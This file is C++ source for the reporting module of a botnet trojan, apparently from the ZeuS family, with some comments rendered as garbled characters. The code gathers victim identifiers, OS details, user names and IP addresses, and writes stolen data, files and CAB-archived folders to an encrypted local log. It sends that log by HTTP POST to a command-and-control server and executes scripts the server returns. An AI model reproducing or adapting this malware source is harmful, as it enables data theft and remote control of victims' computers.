#include <windows.h>
#include <security.h>
#include <accctrl.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "report.h"
#include "remotescript.h"
#include "localsettings.h"
#include "dynamicconfig.h"
#include "osenv.h"
#include "httptools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\winsecurity.h"
#include "..\common\wsocket.h"
#include "..\common\process.h"
#include "..\common\fs.h"
#include "..\common\time.h"
#include "..\common\sync.h"
#include "..\common\mscab.h"

static WCHAR reportFile[MAX_PATH];
static WCHAR reportFolder[MAX_PATH];

//Types of flows in CreateReportSender.
enum
{
  DEFAULTSENDER_REPORT,
  DEFAULTSENDER_STATUS
};

//Total strukura to work with the server.
typedef struct
{
  BYTE threadType;                   //One of the values ​​TT_ *.
  BinStorage::STORAGEARRAY storage;  //Array.
  Crypt::RC4KEY rc4StorageKey;       //The key for the configuration in the repository.
  WCHAR reportFile[MAX_PATH];        //Current file for processing.
  ThreadsGroup::GROUP *group;        //Group of flows (to create a child thread).
}SENDERDATA;

//Vnutrinnii data XSender.
enum 
{
  DSR_SENDED,    //The report has been submitted.
  DSR_WAIT_DATA, //Waiting for data.
  DSR_ERROR      //Error while otravki.
};

/*
  ������������� ����� ������. ������ ���������� ������ ����� ������� �������� �� ������ �������.

  IN forWrite  - �������������� ��� ������.
  OUT tempFile - ��� ���������� ����� ��� ������� ������. ����� ���� NULL.
*/
static void initReportFile(bool forWrite, LPWSTR tempFile)
{
  //Initialization.
  if(reportFile[0] == 0)
  {
    Core::getPeSettingsPath(Core::PSP_REPORTFILE, reportFile);
    
    //Directory
    Str::_CopyW(reportFolder, reportFile, -1);
    CWA(shlwapi, PathRemoveFileSpecW)(reportFolder);
    
    WDEBUG1(WDDT_INFO, "reportFile=[%s].", reportFile);
  }

  //Temporary file.
  if(tempFile != NULL)
  {
    Str::_CopyW(tempFile, reportFile, -1);
    CWA(shlwapi, PathRenameExtensionW)(tempFile, FILEEXTENSION_TEMP);
  }
 
  //Verification of rights.
  if(forWrite && coreData.integrityLevel > Process::INTEGRITY_LOW)
  {
    Fs::_createDirectoryTree(reportFolder, /*&coreData.securityAttributes.saAllowAll*/NULL);
    WinSecurity::_setLowIntegrityLevelLabel(reportFolder, SE_FILE_OBJECT, true);
    if(CWA(kernel32, GetFileAttributesW)(reportFile) != INVALID_FILE_ATTRIBUTES)WinSecurity::_setLowIntegrityLevelLabel(reportFile, SE_FILE_OBJECT, true);
  }
}

/*
  ���������� ������ IP-������� � �����.

  IN OUT binStorage - �����.
  IN family         - AF_INET ��� AF_INTET6.

  Return            - true - � ������ ������,
                      false - � ������ ������.
*/
static bool addIpAddressesToReport(BinStorage::STORAGE **binStorage, int family)
{
  bool r = false;
  SOCKET_ADDRESS_LIST *list = WSocket::getListOfIpAddresses(family);

  if(list != NULL)
  {
    LPBYTE buf = (LPBYTE)Mem::alloc((family == AF_INET ? IPv4_SIZE : IPv6_SIZE) * list->iAddressCount);
    if(buf != NULL)
    {
      DWORD bufSize = 0;
      for(DWORD i = 0; i < list->iAddressCount; i++)
      {
        if(family == AF_INET)
        {
          Mem::_copy(buf + bufSize, &((SOCKADDR_IN *)(list->Address[i].lpSockaddr))->sin_addr.S_un.S_addr, IPv4_SIZE);
          bufSize += IPv4_SIZE;
        }
        else
        {
          Mem::_copy(buf + bufSize, ((SOCKADDR_IN6 *)(list->Address[i].lpSockaddr))->sin6_addr.u.Byte, IPv6_SIZE);
          bufSize += IPv6_SIZE;
        }
      }

      r = BinStorage::_addItem(binStorage, family == AF_INET ? SBCID_IPV4_ADDRESSES : SBCID_IPV6_ADDRESSES, BinStorage::ITEMF_COMBINE_OVERWRITE, buf, bufSize);
      Mem::free(buf);
    }
    Mem::free(list);
  }
  return r;
}

void Report::init(void)
{
  reportFile[0] = 0;
}

void Report::uninit(void)
{

}

bool Report::addBasicInfo(BinStorage::STORAGE **binStorage, DWORD flags)
{
  bool r = true;
  bool created = false;
  
  if(*binStorage == NULL)
  {
    if((*binStorage = BinStorage::_createEmpty()) == NULL)return false;
    created = true;
  }

  if(flags & BIF_BOT_ID)
  {
    if(r)
    {
      PESETTINGS pes;
      Core::getPeSettings(&pes);
      
      r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_BOT_ID, BinStorage::ITEMF_COMBINE_OVERWRITE, pes.compId);
    }
    
    if(r)
    {
      WCHAR botnet[BOTNET_MAX_CHARS + 1];
      Core::getCurrentBotnetName(botnet);
      if(botnet[0] != 0)r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_BOTNET, BinStorage::ITEMF_COMBINE_OVERWRITE, botnet);
    }
  }

  if(r && flags & BIF_BOT_VERSION)
  {
    DWORD version = BO_CLIENT_VERSION;
    r = BinStorage::_addItem(binStorage, SBCID_BOT_VERSION, BinStorage::ITEMF_COMBINE_OVERWRITE, &version, sizeof(DWORD));
  }

  if(flags & BIF_TIME_INFO)
  {
    DWORD time;
    if(r)
    {
      time = Time::_getTime();
      r = BinStorage::_addItem(binStorage, SBCID_TIME_SYSTEM, BinStorage::ITEMF_COMBINE_OVERWRITE, &time, sizeof(DWORD));
    }

    if(r)
    {
      time = (DWORD)Time::_getLocalGmt();
      r = BinStorage::_addItem(binStorage, SBCID_TIME_LOCALBIAS, BinStorage::ITEMF_COMBINE_OVERWRITE, &time, sizeof(DWORD));
    }

    if(r)
    {
      time = CWA(kernel32, GetTickCount)();
      r = BinStorage::_addItem(binStorage, SBCID_TIME_TICK, BinStorage::ITEMF_COMBINE_OVERWRITE, &time, sizeof(DWORD));
    }
  }

  if(r && flags & BIF_OS)
  {
    OsEnv::OSINFO oi;
    OsEnv::_getVersionEx(&oi);

    r = BinStorage::_addItem(binStorage, SBCID_OS_INFO, BinStorage::ITEMF_COMBINE_OVERWRITE, &oi, sizeof(OsEnv::OSINFO));

    if(r)
    {
      LANGID lang = CWA(kernel32, GetUserDefaultUILanguage)();
      r = BinStorage::_addItem(binStorage, SBCID_LANGUAGE_ID, BinStorage::ITEMF_COMBINE_OVERWRITE, &lang, sizeof(LANGID));
    }
  }

  if(r && flags & BIF_PROCESS_FILE)
  {
    WCHAR file[MAX_PATH];
    DWORD size;

    if((size = CWA(kernel32, GetModuleFileNameW)(NULL, file, MAX_PATH - 1)) > 0)
    {
      file[size] = 0; //Just in case.
      r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_NAME, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
    }

    size = sizeof(file) / sizeof(WCHAR);
    if(r && CWA(secur32, GetUserNameExW)(NameSamCompatible, file, &size) != FALSE && size > 0)
    {
      file[size] = 0; //Just in case.
      r = BinStorage::_addItemAsUtf8StringW(binStorage, SBCID_PROCESS_USER, BinStorage::ITEMF_COMBINE_OVERWRITE, file);
    }
  }

  if(r && flags & BIF_IP_ADDRESSES)
  {
    //Do not check the return code, because interfaces may not exist.
    addIpAddressesToReport(binStorage, AF_INET);
    addIpAddressesToReport(binStorage, AF_INET6);
  }

  if(r == false && created == true)
  {
    Mem::free(*binStorage);
    *binStorage = NULL;
  }

  return r;
}

static int defaultSenderRequestProc(DWORD loop, Report::SERVERSESSION *session)
{
  SENDERDATA *senderData = (SENDERDATA *)session->customData;
  
  if(senderData->threadType == DEFAULTSENDER_STATUS)
  {
    LocalSettings::SETTINGS ls;
    DWORD latency = Wininet::_testDownloadDelay(TESTLATENCY_URL, coreData.globalHandles.stopEvent);
    LocalSettings::getCurrent(&ls);
    
    if(Report::addBasicInfo(&session->postData, Report::BIF_BOT_VERSION | Report::BIF_TIME_INFO | Report::BIF_OS | Report::BIF_IP_ADDRESSES) &&
       BinStorage::_addItem(&session->postData, SBCID_NET_LATENCY, BinStorage::ITEMF_COMBINE_OVERWRITE, &latency,      sizeof(DWORD)) &&
       BinStorage::_addItem(&session->postData, SBCID_TCPPORT_S1,  BinStorage::ITEMF_COMBINE_OVERWRITE, &ls.tcpPortS1, sizeof(WORD)))
    {
      return Report::SSPR_CONTUNUE;
    }    
  }
  else //if (senderData-> threadType == DEFAULTSENDER_REPORT)
  {
    //If the first request.
    if(loop == 0)
    {
      //Insurance.
      BinStorage::_closeStorageArray(&senderData->storage);
      
      //Obtain the encryption keys.
      {
        PESETTINGS pes;
        Core::getPeSettings(&pes);
        senderData->storage.xorKey = pes.storageArrayKey;
        Mem::_copy(&senderData->rc4StorageKey, &pes.rc4Key, sizeof(Crypt::RC4KEY));
      }

      //Open.
      if(!BinStorage::_openStorageArray(senderData->reportFile, BinStorage::OSF_WRITE_ACCESS, &senderData->storage))
      {
        //Such a bold move by the fact that the main stream, creates a session only if
        //the presence of the log file, and if it failed to open, simply remove and leave.
        goto REMOVE_REPORT_FILE;
      }
    }

    //Residency next item.
    BinStorage::STORAGE *binStorage;
    DWORD size;
    if(BinStorage::_getNextFromStorageArray(&senderData->storage, &binStorage, &size, &senderData->rc4StorageKey) && size > 0)
    {
      BinStorage::STORAGE *newBinStorage = BinStorage::_combine(session->postData, binStorage);
      Mem::free(binStorage);

      if(newBinStorage != NULL)
      {
        Mem::free(session->postData);
        session->postData = newBinStorage;
        
        WDEBUG0(WDDT_INFO, "Sending report.");
        return Report::SSPR_CONTUNUE;
      }

      WDEBUG0(WDDT_ERROR, "Not enough memory.");
    }

    //Deleting a file.
REMOVE_REPORT_FILE:
    /*
      � ������ ������ �������� �����, ��������� ��������� �����������, ��� ���������� ����� �����,
      ��� ������ BinStorage::_Combine(� ����� ��������� ������ �������� �������� ����� ������ �������),
      ��������� ������ � ������� ����.

      ��� �������� ��� ����������� ����������� ����������� �������� ������� � ������ �����-��
      �������� ������.
    */
    WDEBUG0(WDDT_INFO, "End of storage file founded, stopping session.");
    BinStorage::_closeStorageArray(&senderData->storage);
    Fs::_removeFile(senderData->reportFile);
    return Report::SSPR_END;
  }

  return Report::SSPR_ERROR;
}

static int defaultSenderResultProc(DWORD loop, Report::SERVERSESSION *session)
{
  SENDERDATA *senderData = (SENDERDATA *)session->customData;
  
  //Execution of scripts.
  if(session->postData->count > 0 && session->postData->size > sizeof(BinStorage::STORAGE) + sizeof(BinStorage::ITEM))
  {
    BinStorage::STORAGE *script = (BinStorage::STORAGE *)Mem::copyEx(session->postData, session->postData->size);
    if(script != NULL && !RemoteScript::_exec(script))Mem::free(script);
  }

  //Tag Report as otpraldvennogo.
  if (senderData-> threadType == DEFAULTSENDER_REPORT)
  {
    if(BinStorage::_removeCurrentFromStorageArray(&senderData->storage))return Report::SSPR_CONTUNUE;
    WDEBUG0(WDDT_INFO, "Unknown error in storage file founded, stopping session.");
    BinStorage::_closeStorageArray(&senderData->storage);
    Fs::_removeFile(senderData->reportFile);
  }

  return Report::SSPR_END;
}

/*  Search for a file to upload.

  OUT fileName - the full path of the file.
  IN tempFile - the full path of the temporary file.
  IN maxDelay - max delay time for the report max (errorDelay, normalDelay).

  Return - true - the file is found,
                 false - file not found.*/
static bool findReportFileForSending(LPWSTR fileName, LPWSTR tempFile, DWORD maxDelay)
{
  //Check is not sent out a temporary file.
  if(CWA(kernel32, GetFileAttributesW)(tempFile) != INVALID_FILE_ATTRIBUTES)
  {
    Str::_CopyW(fileName, tempFile, -1);
    return true;
  }
  
  //Check the log file.
  if(CWA(kernel32, GetFileAttributesW)(reportFile) != INVALID_FILE_ATTRIBUTES)
  {
    Str::_CopyW(fileName, reportFile, -1);
    return true;
  }
  return false;  
}

static DWORD WINAPI defaultSender(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  SENDERDATA *senderData = (SENDERDATA *)p;
  
  HANDLE mutex = Core::waitForMutexOfObject(senderData->threadType == DEFAULTSENDER_REPORT ? Core::OBJECT_ID_SERVER_SESSION_REPORT : Core::OBJECT_ID_SERVER_SESSION_STATUS, MalwareTools::KON_GLOBAL);
  if(mutex == NULL)
  {
    WDEBUG1(WDDT_ERROR, "Failed, %u.", senderData->threadType);
    Mem::free(senderData);
    return 1;
  }

  //Nasatraivaem session data.
  Report::SERVERSESSION serverSession;
  Crypt::RC4KEY rc4Key;
  
  serverSession.requestProc = defaultSenderRequestProc;
  serverSession.resultProc  = defaultSenderResultProc;
  serverSession.stopEvent   = coreData.globalHandles.stopEvent;
  serverSession.rc4Key      = &rc4Key;
  serverSession.customData  = senderData;

  //Got timeout.
  DWORD normalDelay;
  DWORD errorDelay;
  DWORD maxDelay;
  {
    BASECONFIG baseConfig;
    Core::getBaseConfig(&baseConfig);
    Mem::_copy(&rc4Key, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
    
    switch(senderData->threadType)
    {
      case DEFAULTSENDER_REPORT:
        normalDelay = HIWORD(baseConfig.delayReport);
        errorDelay  = LOWORD(baseConfig.delayReport);
        break;
    
      case DEFAULTSENDER_STATUS:
        normalDelay  = HIWORD(baseConfig.delayStats);
        errorDelay   = LOWORD(baseConfig.delayStats);
        break;
    }

    normalDelay *= 60 * 1000;
    errorDelay  *= 60 * 1000;
    maxDelay     = max(normalDelay, errorDelay);
    
    Mem::_zero(&baseConfig, sizeof(BASECONFIG));
  }
  
  //Start.
  BYTE loopResult;
  WCHAR tempFile[MAX_PATH];

  tempFile[0] = 0;
  
  WDEBUG1(WDDT_INFO, "Started, %u.", senderData->threadType);
  if(Core::isActive())do
  {
    loopResult = DSR_WAIT_DATA;

    //Check the availability of reports.
    if (senderData-> threadType == DEFAULTSENDER_REPORT)
    {
      initReportFile(false, tempFile[0] == 0 ? tempFile : NULL);
      if(!findReportFileForSending(senderData->reportFile, tempFile, maxDelay))continue;
      
      //Check file.
      {
        DWORD64 fileSize = Fs::_getFileSizeEx(senderData->reportFile);
        if(fileSize == (DWORD)(-1) || fileSize > 0xFFFFFFFF)
        {
          Fs::_removeFile(senderData->reportFile);
          WDEBUG1(WDDT_WARNING, "Removed \"%s\".", senderData->reportFile);
          continue;
        }
      }
      
      WDEBUG1(WDDT_INFO, "Founded \"%s\".", senderData->reportFile);

      //Move the temporary file.
      if(CWA(kernel32, lstrcmpiW)(senderData->reportFile, tempFile) != 0)
      {
        HANDLE reportMutex = Core::waitForMutexOfObject(Core::OBJECT_ID_REPORTFILE, MalwareTools::KON_GLOBAL);
        if(reportMutex == NULL)
        {
          WDEBUG0(WDDT_ERROR, "Mutex failed.");
          continue;
        }

        if(CWA(kernel32, MoveFileExW)(senderData->reportFile, tempFile, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH) == FALSE)
        {
          WDEBUG2(WDDT_ERROR, "Failed to move file \"%s\" => \"%s\".", senderData->reportFile, tempFile);
          continue;
        }
        
        Sync::_freeMutex(reportMutex);
        Str::_CopyW(senderData->reportFile, tempFile, -1);
      }
    }
    
    //Create the session.
    BinStorage::STORAGE *binStorage = DynamicConfig::getCurrent();
    if(binStorage != NULL)
    {
      serverSession.url = (LPSTR)BinStorage::_getItemDataEx(binStorage, CFGID_URL_SERVER_0, BinStorage::ITEMF_IS_OPTION, NULL);
      Mem::free(binStorage);
      if(serverSession.url != NULL)
      {
        serverSession.postData = NULL;
        if(Report::addBasicInfo(&serverSession.postData, Report::BIF_BOT_ID))
        {
          senderData->storage.file = INVALID_HANDLE_VALUE;
          loopResult = Report::startServerSession(&serverSession) ? DSR_SENDED : DSR_ERROR;
          BinStorage::_closeStorageArray(&senderData->storage);
          Mem::free(serverSession.postData);
        }
      }
#     if(BO_DEBUG > 0)
      else WDEBUG0(WDDT_ERROR, "CFGID_URL_SERVER_0 is empty.");
#     endif
      Mem::free(serverSession.url);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_WARNING, "Configuration not founded.");
#   endif
  }
  while(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, loopResult == DSR_ERROR ? errorDelay : (loopResult == DSR_SENDED ? normalDelay : 30000)) == WAIT_TIMEOUT);

  WDEBUG1(WDDT_INFO, "Stopped, %u.", senderData->threadType);
  Sync::_freeMutex(mutex);
  Mem::free(senderData);

  return 0;
}

bool Report::_create(ThreadsGroup::GROUP *group)
{
  SENDERDATA *data1;
  SENDERDATA *data2;

  if((data1 = (SENDERDATA *)Mem::alloc(sizeof(SENDERDATA))) && (data2 = (SENDERDATA *)Mem::alloc(sizeof(SENDERDATA))))
  {
    data1->threadType = DEFAULTSENDER_STATUS;
    data1->group      = group;
    data2->threadType = DEFAULTSENDER_REPORT;
    data2->group      = group;

    bool ok1 = ThreadsGroup::_createThread(group, 0, defaultSender, data1, NULL, NULL);
    bool ok2 = ThreadsGroup::_createThread(group, 0, defaultSender, data2, NULL, NULL);
    return (ok1 || ok2);
  }

  return false; 
}

static int __inline sendRequest(HttpTools::URLDATA *ud, HINTERNET serverHandle, Report::SERVERSESSION *session, BinStorage::STORAGE *originalPostData, DWORD loop)
{
  int result = Report::SSPR_ERROR;
  session->postData = originalPostData == NULL ? BinStorage::_createEmpty() : (BinStorage::STORAGE *)Mem::copyEx(originalPostData, originalPostData->size);

  if(session->postData != NULL)
  {
    DWORD size;
    int procRetCode = session->requestProc(loop, session);

    if(procRetCode != Report::SSPR_CONTUNUE)result = procRetCode;
    else if(session->postData != NULL && (size = BinStorage::_pack(&session->postData, BinStorage::PACKF_FINAL_MODE, (Crypt::RC4KEY *)session->rc4Key)) > 0)
    {
      //Send request.
      DWORD requestFlags = Wininet::WISRF_METHOD_POST | Wininet::WISRF_KEEP_CONNECTION;
      if(ud->scheme == HttpTools::UDS_HTTPS)requestFlags |= Wininet::WISRF_IS_HTTPS;

      HINTERNET requestHandle = Wininet::_SendRequest(serverHandle, ud->uri, NULL, session->postData, size, requestFlags);
      if(requestHandle != NULL)
      {
        //Get an answer.
        MEMDATA md;
        if(Wininet::_DownloadData(requestHandle, &md, 0, session->stopEvent))
        {
          //Unpacking the answer.
          size = BinStorage::_unpack(NULL, md.data, md.size, (Crypt::RC4KEY *)session->rc4Key);

          Mem::free(session->postData);
          session->postData = (BinStorage::STORAGE *)md.data;

          if(size > 0)result = session->resultProc(loop, session);
        }
        CWA(wininet, InternetCloseHandle)(requestHandle);
      }
    }

    Mem::free(session->postData);
  }
  return result;
}

bool Report::startServerSession(SERVERSESSION *session)
{
  WDEBUG1(WDDT_INFO, "url=%S", session->url);

  bool retVal = false;
  HttpTools::URLDATA ud;
  BinStorage::STORAGE *originalPostData = session->postData; //Save the original post-data.

  if(HttpTools::_parseUrl(session->url, &ud))
  {
    Core::initHttpUserAgent();

    //Repeat cycle connections to the server in case of disconnection or unavailable.
    for(BYTE bi = 0; bi < WININET_CONNECT_RETRY_COUNT && retVal == false; bi++)
    {
      //Delay.
      if(bi > 0)
      {
        if(session->stopEvent != NULL)
        {
          if(CWA(kernel32, WaitForSingleObject)(session->stopEvent, WININET_CONNECT_RETRY_DELAY) != WAIT_TIMEOUT)break;
        }
        else CWA(kernel32, Sleep)(WININET_CONNECT_RETRY_DELAY);
      }

      //Create a handle to the server.
      HINTERNET serverHandle = Wininet::_Connect(coreData.httpUserAgent, ud.host, ud.port, bi % 2 == 0 ? Wininet::WICF_USE_IE_PROXY : 0);
      if(serverHandle != NULL)
      {
        for(DWORD loop = 0;; loop++)
        {
          int r = sendRequest(&ud, serverHandle, session, originalPostData, loop);
          if(r == SSPR_ERROR)break;
          else if(r == SSPR_END){retVal = true; break;}
        }
        Wininet::_CloseConnection(serverHandle);
      }
    }
    HttpTools::_freeUrlData(&ud);
  }

  session->postData = originalPostData; //Restoring the original post-data.
  return retVal;
}

bool Report::writeData(DWORD type, LPWSTR sourcePath, LPWSTR destPath, void *data, DWORD dataSize)
{
  bool retVal = false;
  BinStorage::STORAGE *binStorage = NULL;

  if(dataSize < BINSTORAGE_MAX_SIZE && addBasicInfo(&binStorage, BIF_BOT_VERSION | BIF_TIME_INFO | BIF_OS | BIF_PROCESS_FILE))
  {
    if(BinStorage::_addItem(&binStorage, SBCID_BOTLOG_TYPE, BinStorage::ITEMF_COMBINE_OVERWRITE, &type, sizeof(DWORD)) &&
       BinStorage::_addItem(&binStorage, SBCID_BOTLOG,      BinStorage::ITEMF_COMBINE_OVERWRITE, data, dataSize))
    {
      if(sourcePath == NULL || BinStorage::_addItemAsUtf8StringW(&binStorage, SBCID_PATH_SOURCE, BinStorage::ITEMF_COMBINE_OVERWRITE, sourcePath))
      {
        if(destPath == NULL || BinStorage::_addItemAsUtf8StringW(&binStorage, SBCID_PATH_DEST, BinStorage::ITEMF_COMBINE_OVERWRITE, destPath))
        {
          HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_REPORTFILE, MalwareTools::KON_GLOBAL);
          if(mutex != NULL)
          {
            PESETTINGS pes;
            BinStorage::STORAGEARRAY storageArray;
            
            Core::getPeSettings(&pes);
            initReportFile(true, NULL);
            
            storageArray.xorKey = pes.storageArrayKey;

            if(BinStorage::_openStorageArray(reportFile, BinStorage::OSF_WRITE_ACCESS, &storageArray))
            {
              DWORD size = BinStorage::_pack(&binStorage, 0, &pes.rc4Key);
              if(size > 0)retVal = BinStorage::_addToStorageArray(&storageArray, binStorage, size);
              BinStorage::_closeStorageArray(&storageArray);
            }
            Sync::_freeMutex(mutex);
          }
          WDEBUG3(WDDT_INFO, "Writed new report: retVal=%u, type=%u, dataSize=%u", retVal, type, dataSize);
        }
      }
    }
    Mem::free(binStorage);
  }
  return retVal;
}

bool Report::writeIStream(DWORD type, LPWSTR sourcePath, LPWSTR destPath, IStream *data)
{
  STATSTG ss;
  bool ok = false;
  if(data->Stat(&ss, STATFLAG_NONAME) == S_OK && ss.cbSize.LowPart < BINSTORAGE_MAX_SIZE && ss.cbSize.HighPart == 0)
  {
    DWORD size = ss.cbSize.LowPart;
    void *buf = Mem::alloc(size);
    if(buf != NULL)
    {
      if(data->Read(buf, size, &size) == S_OK)ok = writeData(type, sourcePath, destPath, buf, size);
      Mem::free(buf);
    }
  }
  return ok;
}

bool Report::writeString(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR string)
{
  bool r = false;
  Str::UTF8STRING u8s;
  if(Str::_utf8FromUnicode(string, -1, &u8s))
  {
    r =  writeData(type, sourcePath, destPath, u8s.data, u8s.size);
    Str::_utf8Free(&u8s);
  }
  return r;
}

bool Report::writeStringFormat(DWORD type, LPWSTR sourcePath, LPWSTR destPath, LPWSTR format, ...)
{
  LPWSTR buf = NULL;
  va_list list;
  
  va_start(list, format);
  int size = Str::_vsprintfExW(&buf, format, list);
  va_end(list);

  if(size != -1)
  {
    Str::UTF8STRING u8s;
    bool r = Str::_utf8FromUnicode(buf, size, &u8s);
    Mem::free(buf);
    if(r)
    {
      r =  writeData(type, sourcePath, destPath, u8s.data, u8s.size);
      Str::_utf8Free(&u8s);
    }
    return r;
  }
  return false;
}

bool Report::writeFile(LPWSTR file, LPWSTR sourcePath, LPWSTR destPath)
{
  bool retVal = false;
  Fs::MEMFILE mf; 
  if(Fs::_fileToMem(file, &mf, Fs::FTOMF_SHARE_WRITE))
  {
    retVal = writeData(BLT_FILE, sourcePath == NULL ? file : sourcePath, destPath, mf.data, mf.size);
    Fs::_closeMemFile(&mf);
  }
  return retVal;
}

bool Report::writeFolderAsArchive(LPWSTR path, LPWSTR *fileMask, DWORD fileMaskCount, LPWSTR destPath, DWORD flags)
{
  bool retVal = false;
  WCHAR tmpFile[MAX_PATH];
  
  if(Fs::_createTempFile(L"bc", tmpFile) && Fs::_removeFile(tmpFile) && MsCab::createFromFolder(tmpFile, path, NULL, fileMask, fileMaskCount, flags & WFAA_RECURSE ? MsCab::CFF_RECURSE : 0))
  {
    retVal = writeFile(tmpFile, path, destPath);
    Fs::_removeFile(tmpFile);
  }
  return retVal;
}
